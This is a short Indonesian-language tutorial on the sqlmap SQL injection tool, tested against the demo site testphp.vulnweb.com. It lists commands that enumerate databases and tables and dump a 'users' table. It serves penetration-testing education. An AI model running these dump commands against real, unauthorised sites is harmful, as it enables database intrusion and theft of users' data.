# sqlmap
Tool ini digunakan untuk melakukan exploitasi kerentanan SQL Injection. Tool ini sudah tersedia secara otomatis di kali linux

- Link download dan instalasi: https://github.com/sqlmapproject/sqlmap

## Contoh Penggunaan
- Dokumentasi penggunaan tool sqlmap dapat dilihat dengan perintah berikut
```sh
sqlmap -h
```

- Pengujian dilakukan pada web http://testphp.vulnweb.com
- Melihat seluruh database
```sh
sqlmap -u url --dbs
```

- Melihat database saat ini
```sh
sqlmap -u url --current-db
```

- Ditemukan 2 buah database pada hasil proses diatas. Sekarang kita coba lihat daftar tabel di salah satu database
```sh
sqlmap -u url -D database --tables
```


- Ditemukan tabel `users` dari hasil proses diatas. Sekarang kita coba lihat isi tabel `users`
```sh
sqlmap -u url -D database -T tabel --dump
```

- Hasil dump data otomatis tersimpan dalam sebuah file